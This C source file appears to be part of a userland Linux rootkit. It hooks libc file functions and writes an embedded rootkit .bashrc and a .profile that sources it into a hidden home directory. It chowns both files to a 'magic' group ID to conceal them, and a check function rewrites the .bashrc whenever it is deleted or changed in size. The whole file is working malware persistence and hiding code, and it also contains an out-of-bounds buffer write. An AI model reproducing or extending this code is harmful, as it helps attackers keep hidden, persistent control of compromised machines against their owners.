#include "bashrc.h"

int writebashrc(void){
    DIR *dp;

    hook(COPENDIR, CFOPEN, CFWRITE);
    
    dp = call(COPENDIR, HOMEDIR);
    if(dp == NULL) return -1;
    closedir(dp);

    char rcbuf[RKBASHRC_SIZE+1], tmp[2], curchar;
    memset(rcbuf, 0, RKBASHRC_SIZE);
    for(int i = 0; i < RKBASHRC_SIZE; i++){
        curchar = rkbashrc[i];
        snprintf(tmp, 2, "%c", curchar);
        strcat(rcbuf, tmp);
    }
    rcbuf[RKBASHRC_SIZE+1] = '\0';

    FILE *fp;

    fp = call(CFOPEN, PROFILE_PATH, "w");
    char *profile = ". .bashrc";
    if(fp == NULL)
        return -1;
    call(CFWRITE, profile, 1, strlen(profile), fp);
    fclose(fp);

    fp = call(CFOPEN, BASHRC_PATH, "w");
    if(fp == NULL)
        return -1;
    call(CFWRITE, rcbuf, 1, strlen(rcbuf), fp);
    fclose(fp);

    gid_t magicgid = readgid();
    chown_path(PROFILE_PATH, magicgid);
    chown_path(BASHRC_PATH, magicgid);

    return 0;
}

void checkbashrc(void){
    if(!rkprocup())
        return;

    struct stat rcstat;
    memset(&rcstat, 0, sizeof(struct stat));
    hook(C__XSTAT);

    int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
    if((statstat < 0 && errno == ENOENT) || (statstat != -1 && rcstat.st_size != RKBASHRC_SIZE)){
        writebashrc();
        return;
    }
}